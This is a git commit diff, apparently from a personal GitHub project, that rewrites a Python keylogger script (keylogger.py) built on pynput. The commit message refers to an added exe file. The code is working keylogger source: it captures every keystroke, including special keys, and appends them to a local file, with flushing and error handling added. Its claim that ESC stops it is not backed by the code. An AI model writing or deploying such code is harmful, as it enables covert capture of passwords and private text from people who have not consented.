0e071dd09a993b173c91bb5175ded3a5289f2630
JayAlton <32560528+JayAlton@users.noreply.github.com>
2024-12-16 17:41:55 -0800

    added exe file

--- keylogger.py
+++ keylogger.py
@@ -1,30 +1,26 @@
 from pynput import keyboard
 
 def keyPressed(key):
-    print(str(key))
-    with open("keyfile.txt", 'a') as logKey:
-        try:
-            # Check if the key has a char attribute (i.e., it's a regular key)
-            char = key.char
-            if char:
-                logKey.write(char)
-        except AttributeError:
-            # Handle special keys
-            if key == keyboard.Key.space:
-                logKey.write(' ')
-            elif key == keyboard.Key.backspace:
-                logKey.write(' [BACKSPACE] ')
-            elif key == keyboard.Key.enter:
-                logKey.write('\n')
-            elif key == keyboard.Key.shift:
-                logKey.write(' [SHIFT] ')
-            elif key == keyboard.Key.caps_lock:
-                logKey.write(' [CAPS_LOCK] ')
+    try:
+        with open("keyfile.txt", 'a') as logKey:
+            if hasattr(key, 'char') and key.char:
+                logKey.write(key.char)
             else:
-                # For other special keys, write their name
-                logKey.write(f' [{key}] ')
+                if key == keyboard.Key.space:
+                    logKey.write(' [SPACE] ')
+                elif key == keyboard.Key.enter:
+                    logKey.write(' [ENTER]\n')
+                elif key == keyboard.Key.backspace:
+                    logKey.write(' [BACKSPACE] ')
+                elif key == keyboard.Key.shift:
+                    logKey.write(' [Shift] ')
+                else:
+                    logKey.write(f' [{key}] ')
+            logKey.flush()  # Force write to file
+    except Exception as e:
+        print(f"Error: {e}")
 
 if __name__ == "__main__":
-    listener = keyboard.Listener(on_press=keyPressed)
-    listener.start()
-    input()
+    print("Keylogger running... Press ESC to stop.")
+    with keyboard.Listener(on_press=keyPressed) as listener:
+        listener.join()
